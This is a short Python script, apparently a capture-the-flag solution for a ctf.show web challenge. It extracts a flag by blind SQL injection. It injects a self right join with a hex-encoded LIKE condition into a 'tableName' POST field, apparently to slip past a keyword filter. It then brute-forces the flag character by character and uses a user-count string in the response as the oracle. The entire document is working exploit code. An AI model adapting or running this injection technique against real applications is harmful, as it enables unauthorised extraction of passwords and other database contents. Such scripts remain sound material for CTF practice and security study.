import binascii
import requests

def str_to_hex(s):
    return '0x'+binascii.b2a_hex(s.encode()).decode()

url = "http://f4adf83c-0666-4632-85dc-4dea8ca0a228.challenge.ctf.show//select-waf.php"
str = "0123456789abcdef{}-_"
flag = "ctfshow"
for i in range(0,60):
    for j in str:
        res = str_to_hex(flag+j+'%')
        data = {"tableName":f"ctfshow_user as a right join ctfshow_user as b on b.pass like {res}"}
        r = requests.post(url=url, data=data).text
        if "$user_count = 43" in r:
            flag += j
            print(flag)
            if j=="}":
                exit()
            break